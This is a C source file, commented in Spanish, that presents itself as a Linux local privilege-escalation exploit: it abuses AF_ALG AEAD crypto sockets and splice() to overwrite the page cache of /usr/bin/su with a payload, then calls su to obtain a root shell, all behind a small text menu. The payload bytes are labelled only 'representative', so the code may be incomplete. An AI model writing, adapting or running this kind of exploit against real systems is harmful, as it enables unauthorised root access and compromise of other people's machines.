#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <sys/uio.h>
#include <termios.h>
#include <stdint.h> // <--- El fix para uint32_t

// --- Estética ---
#define CLR_YELLOW "\033[93m"
#define CLR_RED    "\033[91m"
#define CLR_RESET  "\033[0m"
#define CLR_BOLD   "\033[1m"

// Payload representativo (debe ser el resultado de zlib.decompress del hex original)
unsigned char PAYLOAD_RAW[] = {
    0x00, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5f, 0x73, 0x75, 0x5f, 0x62, 0x79, 0x70, 0x61, 
    0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void run_exploit() {
    printf(CLR_RED "\n[!] Lanzando Exploit (Modo Hefinito)..." CLR_RESET "\n");

    int f = open("/usr/bin/su", O_RDONLY);
    if (f < 0) { perror("open su"); return; }

    for (int i = 0; i < sizeof(PAYLOAD_RAW); i += 4) {
        int a = socket(38, 5, 0); // AF_ALG
        struct sockaddr_alg sa = { 
            .salg_family = 38, 
            .salg_type = "aead", 
            .salg_name = "authencesn(hmac(sha256),cbc(aes))" 
        };
        bind(a, (struct sockaddr *)&sa, sizeof(sa));

        // Configuración de opciones de socket
        unsigned char opt1[72] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
        setsockopt(a, 279, 1, opt1, 72);
        uint32_t val = 4;
        setsockopt(a, 279, 5, &val, 4);

        int u = accept(a, NULL, 0);

        // Estructura de Control (Replica exacta de sendmsg en Python)
        struct msghdr msg = {0};
        char control[128];
        memset(control, 0, sizeof(control));
        msg.msg_control = control;
        msg.msg_controllen = sizeof(control);

        struct cmsghdr *cmsg;
        
        // CMSG level 279, type 3 (Aumentar tamaño de asociación)
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = 279; cmsg->cmsg_type = 3; cmsg->cmsg_len = CMSG_LEN(4);

        // CMSG level 279, type 2 (IV / Nonce)
        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = 279; cmsg->cmsg_type = 2; cmsg->cmsg_len = CMSG_LEN(20);
        ((unsigned char*)CMSG_DATA(cmsg))[0] = 0x10;

        // CMSG level 279, type 4 (AAD length)
        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = 279; cmsg->cmsg_type = 4; cmsg->cmsg_len = CMSG_LEN(4);
        ((unsigned char*)CMSG_DATA(cmsg))[0] = 0x08;

        // I/O Vector: Padding + parte del payload
        struct iovec iov;
        unsigned char buf[8] = {0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00};
        memcpy(buf + 4, &PAYLOAD_RAW[i], 4);
        iov.iov_base = buf;
        iov.iov_len = 8;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        sendmsg(u, &msg, 32768);

        // Splice para corromper la memoria del Kernel
        int p[2];
        pipe(p);
        splice(f, NULL, p[1], NULL, i + 4, 0);
        splice(p[0], NULL, u, NULL, i + 4, 0);

        close(u); close(a); close(p[0]); close(p[1]);
    }

    printf(CLR_BOLD "[+] Payload inyectado. Intentando shell root...\n" CLR_RESET);
    close(f);
    system("su");
}

int main() {
    printf(CLR_YELLOW "--- MODO HEFINSITO NATU C ---\n" CLR_RESET);
    printf("1. Validar Privilegios\n2. EJECUTAR EXPLOIT\n3. Salir\n> ");
    int op;
    if (scanf("%d", &op) != 1) return 0;
    if (op == 2) run_exploit();
    return 0;
}